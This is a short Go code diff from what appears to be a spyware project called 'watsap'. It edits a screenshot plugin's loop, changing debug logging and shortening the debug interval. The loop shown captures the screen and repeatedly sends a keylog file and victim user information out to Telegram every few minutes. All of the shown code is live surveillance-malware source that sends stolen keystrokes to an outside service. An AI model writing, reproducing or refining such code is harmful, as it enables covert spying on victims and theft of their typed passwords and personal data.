@@ -1,6 +1,7 @@
 package screen
 
 import (
+	"log"
 	"time"
 	"watsap/utils/config"
 	"watsap/utils/messages"
@@ -10,13 +11,13 @@ import (
 // to-do: try better approach
 func LoopScreen() {
 	if config.DebugMode {
-		config.Logger("[Screen] Starting screenshot plugin", "default")
+		log.Printf("[Screen] Starting screenshot plugin")
 	}
 	for {
 		InitScreen()
 		telegram.TgSendFile(config.KeylogFile, messages.GetUserInfoMsg())
 		if config.DebugMode {
-			time.Sleep(2 * time.Minute)
+			time.Sleep(1 * time.Minute)
 		} else {
 			time.Sleep(5 * time.Minute)
 		}
